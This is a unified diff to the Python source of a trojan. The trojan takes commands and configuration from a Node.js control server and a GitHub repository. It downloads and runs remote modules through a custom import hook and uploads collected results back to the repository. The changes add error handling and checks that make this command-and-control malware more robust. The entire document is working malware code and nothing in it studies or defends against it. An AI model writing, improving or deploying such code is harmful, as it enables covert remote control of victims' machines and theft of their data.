@@ -18,7 +18,11 @@ def github_connect():
     return sess.repository(user, 'Trojan')
 
 def get_file_contents(dirname, module_name, repo):
-    return repo.file_contents(f'{dirname}/{module_name}').content
+    try:
+        return repo.file_contents(f'{dirname}/{module_name}').content
+    except github3.exceptions.NotFoundError:
+        print(f"[*] File '{dirname}/{module_name}' not found in repository.")
+        return None
 
 class Trojan:
     def __init__(self, id, node_server_url):
@@ -31,11 +35,12 @@ class Trojan:
 
     def get_github_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
-        return json.loads(base64.b64decode(config_json))
+        return json.loads(base64.b64decode(config_json)) if config_json else {}
 
     def get_nodejs_config(self):
         try:
             response = requests.get(f"{self.node_server_url}/config")
+            response.raise_for_status()  # Ensure we catch HTTP errors
             return response.json()
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to get config from Node.js server: {e}")
@@ -43,20 +48,14 @@ class Trojan:
 
     def send_command_result(self, command, result):
         try:
-            payload = {
-                "command": command,
-                "result": result
-            }
+            payload = {"command": command, "result": result}
             requests.post(f"{self.node_server_url}/command", json=payload)
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to send command result to Node.js server: {e}")
 
     def update_status(self, status):
         try:
-            payload = {
-                "id": self.id,
-                "status": status
-            }
+            payload = {"id": self.id, "status": status}
             requests.post(f"{self.node_server_url}/status", json=payload)
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to update status on Node.js server: {e}")
@@ -70,14 +69,25 @@ class Trojan:
         self.send_command_result(command, result)
 
     def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+        if module in sys.modules:
+            try:
+                result = sys.modules[module].run()
+                self.store_module_result(result)
+            except AttributeError:
+                print(f"[*] Module '{module}' does not have a 'run' method.")
+            except Exception as e:
+                print(f"[*] Error running module '{module}': {e}")
+        else:
+            print(f"[*] Module '{module}' not loaded.")
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
-        self.repo.create_file(remote_path, message, bindata)
+        try:
+            self.repo.create_file(remote_path, message, bindata)
+        except github3.exceptions.GitHubError as e:
+            print(f"[*] Failed to store module result: {e}")
 
     def run(self):
         while self.running:
@@ -95,11 +105,19 @@ class Trojan:
 
                 # Execute commands from Node.js server
                 for command in nodejs_config.get('commands', []):
-                    self.execute_command(command)
+                    if isinstance(command, str):
+                        self.execute_command(command)
+                    elif isinstance(command, dict) and 'module' in command:
+                        module_name = command['module']
+                        self.module_runner(module_name)
 
             # Run modules based on GitHub config
             for task in github_config.get('modules', []):
-                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
+                module_name = task['module']
+                if module_name not in sys.modules:
+                    print(f"[*] Module '{module_name}' not found. Skipping...")
+                    continue
+                thread = threading.Thread(target=self.module_runner, args=(module_name,))
                 thread.start()
                 time.sleep(random.randint(1, 10))
 
@@ -114,7 +132,7 @@ class GitImporter:
         self.repo = github_connect()
         try:
             new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
-            if new_library is not None:
+            if new_library:
                 self.current_module_code = base64.b64decode(new_library)
                 return importlib.util.spec_from_loader(fullname, loader=self)
         except github3.exceptions.NotFoundError:
